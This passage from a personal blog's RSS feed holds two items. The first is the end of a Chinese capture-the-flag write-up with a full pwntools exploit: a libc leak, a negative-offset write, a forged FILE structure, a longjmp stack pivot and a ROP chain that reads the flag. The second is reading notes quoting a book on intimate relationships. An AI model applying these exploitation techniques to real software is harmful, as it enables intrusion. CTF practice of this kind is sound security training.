0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;   0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打&lt;code&gt;io_file&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;show&lt;/code&gt;泄露出libc，add通过负数偏移，能写libc中的内容&lt;/p&gt;&#xA;&lt;p&gt;写&lt;code&gt;stdin&lt;/code&gt;，&lt;code&gt;stdout&lt;/code&gt;不能动，接着往下写rop，栈迁移进行rop&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;def add(offset, content):&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 add 函数&#xA;    offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞）&#xA;    content: 要写入的内容&#xA;    &amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;1&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;Please input the offset:\n&amp;#39;, str(offset).encode())&#xA;    p.sendafter(b&amp;#39;Please input the Content:\n&amp;#39;, content)&#xA;&#xA;def show():&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 show 函数&amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;2&amp;#39;)&#xA;&#xA;show()&#xA;libc_base = r64() - 0x282e50 - 0x10000&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;&#xA;&#xA;#    0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;#    0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;#    0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;#    0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;#    0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;#    0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;#    0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;#    0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;# =&amp;gt; 0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;#    0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&#xA;libc.address = libc_base&#xA;magic_gadget = libc_base &amp;#43; 0x49503&#xA;pop_rdi_ret = libc_base &amp;#43; 0x14862&#xA;pop_rsi_ret = libc_base &amp;#43; 0x1c237&#xA;pop_rdx_ret = libc_base &amp;#43; 0x1bea2&#xA;pop_rax_ret = libc_base &amp;#43; 0x1b826&#xA;ret = libc_base &amp;#43; 0xcdc&#xA;fake_file_addr = libc_base &amp;#43; 0x292200&#xA;libc_end_addr = libc_base &amp;#43; 0x296000&#xA;stdin_addr = libc_base &amp;#43; 0x292200&#xA;stdout_addr = libc_base &amp;#43; 0x292300&#xA;rop_addr = libc_base &amp;#43; 0x292430&#xA;&#xA;stdout_struct = (&#xA;    p64(0x45) &amp;#43;                    # &amp;#43;0x00&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x08&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x10&#xA;    p64(libc_base &amp;#43; 0x4a957) &amp;#43;     # &amp;#43;0x18&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x20&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x28&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x30&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x38&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x40&#xA;    p64(libc_base &amp;#43; 0x4aac3) &amp;#43;     # &amp;#43;0x48&#xA;    p64(libc_base &amp;#43; 0x4aabb) &amp;#43;     # &amp;#43;0x50&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x58&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x60&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x68&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x70&#xA;    p64(0x1) &amp;#43;                     # &amp;#43;0x78&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x80&#xA;    p64(0xffffffffffffffff) &amp;#43;      # &amp;#43;0x88&#xA;    p64(0xffffffff) &amp;#43;              # &amp;#43;0x90&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x98&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0xA0&#xA;    p64(0x0)                       # &amp;#43;0xA8&#xA;)&#xA;stdout_struct = stdout_struct.ljust(0xf0, b&amp;#39;\x00&amp;#39;)&#xA;&#xA;&#xA;#0x85&#xA;rop = b&amp;#39;&amp;#39;&#xA;# rop &amp;#43;= p64(pop_rdi_ret)&#xA;# rop &amp;#43;= p64(fake_file_addr) #flag&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(0)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;open&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(3)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;read&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(1)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;write&amp;#39;])&#xA;&#xA;fake_file = b&amp;#34;&amp;#34;&#xA;fake_file &amp;#43;= b&amp;#34;./flag&amp;#34;.ljust(8, b&amp;#39;\x00&amp;#39;)  # flags&#xA;fake_file &amp;#43;= p64(0)  # rpos rbp&#xA;fake_file &amp;#43;= p64(0)  # rend r12&#xA;fake_file &amp;#43;= p64(0)  # close r13&#xA;fake_file &amp;#43;= p64(0)  # wend r14&#xA;fake_file &amp;#43;= p64(0)  # wpos r15&#xA;fake_file &amp;#43;= p64(rop_addr)  # mustbezero_1 rdx rsp&#xA;fake_file &amp;#43;= p64(ret)  # wbase rip&#xA;fake_file &amp;#43;= p64(0)  # read&#xA;fake_file &amp;#43;= p64(magic_gadget)  # write&#xA;fake_file = fake_file.ljust(0xf0, b&amp;#39;\x00&amp;#39;)  # lock = 0&#xA;&#xA;pl = p64(0)*4&#xA;pl &amp;#43;=  fake_file &amp;#43; p64(0)*2&#xA;pl&amp;#43;=  stdout_struct&#xA;pl &amp;#43;= b&amp;#34;\x00&amp;#34;*0x40&#xA;pl &amp;#43;= rop&#xA;# dbg()&#xA;add(-0x30e0-0x100,pl)&#xA;&#xA;# 0x0000000000025b40 : push rax ; ret&#xA;&#xA;&#xA;itr()&#xA;# b *0x7ffff7c00000&amp;#43;0x49503&#xA;# stdin dq 0x00007ffff7e92200 32 &#xA;# bbase 0xa9f&#xA;# sbase 0x201FE0&#xA;# 0x781e1ce953c0&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>《亲密关系》</title>
      <link>http://localhost:1313/posts/read_qmgx/</link>
      <pubDate>Thu, 23 Oct 2025 23:55:44 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_qmgx/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷&#xA;2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;找到你生命中的真爱并不能让你永远幸福。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%)&lt;/li&gt;&#xA;&lt;li&gt;相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%)&lt;/li&gt;&#xA;&lt;li&gt;支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%)&lt;/li&gt;&#xA;&lt;li&gt;开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%)&lt;/li&gt;&#xA;&lt;li&gt;忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%)&lt;/li&gt;&#xA;&lt;li&gt;共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%)&lt;/li&gt;&#xA;&lt;li&gt;公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%)&lt;/li&gt;&#xA;&lt;li&gt;魔力(magic)：保持浪漫；拒绝平淡。(10%)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey &amp;amp; Ehrenberg, 2007)&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky &amp;amp; Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 